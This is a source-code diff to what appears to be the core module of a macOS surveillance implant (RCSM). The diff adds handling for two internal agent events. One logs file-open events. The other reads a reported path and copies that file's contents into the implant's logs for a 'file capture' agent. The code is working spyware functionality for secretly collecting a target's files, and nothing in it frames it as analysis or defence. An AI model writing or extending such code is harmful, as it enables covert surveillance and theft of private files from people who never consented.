@@ -33,6 +33,7 @@
 #import "RCSMCore.h"
 #import "RCSMCommon.h"
 
+#import "RCSMFileSystemManager.h"
 #import "RCSMEncryption.h"
 #import "RCSMLogManager.h"
 #import "RCSMTaskManager.h"
@@ -1191,6 +1192,51 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
                   }
             
+                break;
+              }
+            case AGENT_INTERNAL_FILEOPEN:
+              {
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+
+                if ([_logManager writeDataToLog: logData
+                                       forAgent: AGENT_FILECAPTURE_OPEN
+                                      withLogID: 0] == TRUE)
+                  {
+#ifdef DEBUG_CORE
+                    infoLog(@"Logged file open");
+#endif
+                  }
+            
+                break;
+              }
+            case AGENT_INTERNAL_FILECAPTURE:
+              {
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+
+                NSString *path = [[NSString alloc] initWithData: logData
+                                                       encoding: NSUTF16LittleEndianStringEncoding];
+
+                RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                BOOL success = [fsManager logFileAtPath: path
+                                             forAgentID: AGENT_FILECAPTURE];
+
+                if (!success)
+                  {
+#ifdef DEBUG_CORE
+                    errorLog(@"Error while logging file content at path %@", path);
+#endif
+                  }
+                else
+                  {
+#ifdef DEBUG_CORE
+                    infoLog(@"File content logged correctly for path %@", path);
+#endif
+                  }
+
+                [path release];
+                [fsManager release];
                 break;
               }
             default:
